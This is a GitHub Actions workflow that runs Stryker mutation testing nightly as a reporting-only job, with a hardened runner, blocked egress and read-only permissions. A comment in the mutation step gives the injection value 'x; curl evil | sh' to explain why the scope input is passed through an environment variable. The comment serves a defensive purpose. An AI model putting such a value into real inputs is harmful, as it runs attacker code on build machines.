name: Mutation testing

# ADR-0009 / AGENTS.md record mutation as deliberately OUT of the PR gate:
# "Deliberately not in CI (slow, noisy under contention - run on a quiet
# machine)." That decision is preserved here.
#
# What this workflow adds is CI *execution* without CI *gating*: it runs on a
# nightly schedule and on manual dispatch, reports the score, and uploads the
# HTML report as an artifact. It does NOT run on pull_request and is not a
# required status check, so PR velocity and merge protection are unchanged.
#
# The value is drift detection: a nightly run shows when a change quietly
# lowers the score, and still leaves the humans-vs-agents judgement (merge at
# 70%+, or write an ADR) exactly where AGENTS.md puts it.

on:
  schedule:
    # 03:17 UTC nightly. Off the hour on purpose - scheduled workflows queue
    # behind the busiest :00 runs.
    - cron: "17 3 * * *"
  workflow_dispatch:
    inputs:
      scope:
        description: "Optional glob to scope the run (blank = full mutation sweep)"
        required: false
        type: string

concurrency:
  group: mutation-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read

jobs:
  mutation:
    name: Stryker mutation score (reporting only)
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7

      - name: Harden Runner
        uses: step-security/harden-runner@351661ca32ac09a36dc5ee2d536e3128f2a3c8ed # v2
        with:
          egress-policy: block
          allowed-endpoints: >
            registry.npmjs.org:443
            registry.npmjs.org.:443
            nodejs.org:443

      - uses: pnpm/action-setup@ea17c68df8912ef543352723c149a84f56e3d413 # v6.1.0

      - name: Setup Node
        uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7
        with:
          node-version-file: .nvmrc
          cache: pnpm

      - name: Install dependencies
        run: pnpm install --frozen-lockfile --prefer-offline --ignore-scripts

      - name: Unit tests (required first - Stryker needs a green baseline)
        run: pnpm test:unit

      # inputs.scope is passed through env, not interpolated into the shell
      # string: GitHub substitutes ${{ }} before the shell sees it, so a value
      # like `x; curl evil | sh` would execute (S7630). Quoting "$SCOPE" then
      # keeps whatever arrives as a single argument to --mutate.
      - name: Run mutation tests
        env:
          SCOPE: ${{ inputs.scope }}
        run: |
          if [ -n "$SCOPE" ]; then
            pnpm test:mutation -- --mutate "$SCOPE"
          else
            pnpm test:mutation
          fi

      - name: Upload mutation report
        if: always()
        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7
        with:
          name: mutation-report
          path: reports
          retention-days: 14

      - name: Record score
        if: always()
        shell: bash
        run: |
          {
            echo "## Mutation testing (reporting only - not a PR gate)"
            echo ""
            echo "Scheduled run, see the mutation-report artifact for the HTML detail."
            echo ""
            echo "- Contract: AGENTS.md / ADR-0009 - 70% break overall, 80% for critical modules"
            echo "- Gate status: informational; merge decisions stay with reviewers"
          } >> "$GITHUB_STEP_SUMMARY"